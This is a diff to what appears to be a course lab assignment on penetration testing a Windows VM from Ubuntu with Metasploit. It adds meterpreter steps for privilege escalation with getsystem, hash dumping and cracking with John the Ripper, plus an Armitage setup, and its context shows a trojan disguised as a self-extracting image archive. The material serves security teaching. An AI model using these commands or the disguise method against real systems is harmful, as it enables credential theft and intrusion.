@@ -11,7 +11,7 @@ Install Metasploit framework on Ubuntu then launch it from Ubuntu, carry out a c
 * Both Windows server VM and the Ubuntu VM are used
 * Install Metasploit framework on Ubuntu
 
-You may follow this [installation video](https://youtu.be/qKudXchmnWc).
+You may follow this [installation video](https://youtu.be/qKudXchmnWc) to install Metasploit framework on Ubuntu.
 
 1. Install with [Rapid7 installer](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework) on Ubuntu.
    ```bash
@@ -95,9 +95,15 @@ You may follow this [installation video](https://youtu.be/qKudXchmnWc).
     1. (10%) Dump the hash values of all saved passwords of all windows users, then crack with John the Ripper.
     ```bash
     # Inside meterpreter
-    # 1. dump the hashes
+    # 1. Check the priviledge that meterpreter is currently in
+    getuid
+    # 2. Escalate priviledge
+    use priv
+    getsystem
+    getuid
+    # 3. dump the hashes
     hashdump # save the result in a text file
-    # 2. crack the hashes
+    # 4. crack the hashes
     john --wordlist=pass_dict.txt --format=NT hashes.txt
     ```
     2. (10%) Change Windows users' password. Use a user found above, replace oldpass and newpass with yours
@@ -117,6 +123,24 @@ You may follow this [installation video](https://youtu.be/qKudXchmnWc).
    2. With WinRAR, create a self-extract archive of the cover image and trojan.exe
    3. Configure run after extraction to be: trojan.exe then the cover image.
    4. Download another harmless-look image, convert it into an icon on [icoconvert](https://icoconvert.com/), then use this icon as the icon of the self-extract archive.
+2. Use Metasploit Framework GUI - Armitage
+   1. Install Java JDK
+      ```bash
+      sudo apt install  default-jdk
+      ```
+   2. Download [Armitage](http://www.fastandeasyhacking.com) and extract it.
+   3. Init Metasploit Framework database and load the MSGRPC Plugin
+      ```bash
+      msfdb reinit
+      msfconsole
+      msf > load msgrpc # note down the user name and password used for armitage
+      ```
+    4. Run Armitage and connect to the msfrpc running above
+      ```bash
+      export MSF_DATABASE_CONFIG="/home/$USER/.msf4/database.yml"
+      ./armitage
+      ```
+    5. Enjoy Armitage
 
 **Demo video**
 
@@ -147,3 +171,5 @@ You may follow this [installation video](https://youtu.be/qKudXchmnWc).
   * [Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
   * [Cracking Windows Password Hashes with Hashcat](https://samsclass.info/123/proj14/123p12winhash.htm)
   * [Meterpreter basics practice](https://www.utc.edu/center-academic-excellence-cyber-defense/pdfs/4660-lab6.pdf)
+  * [Armitage](http://www.fastandeasyhacking.com)
+    * [source](https://github.com/rsmudge/armitage)
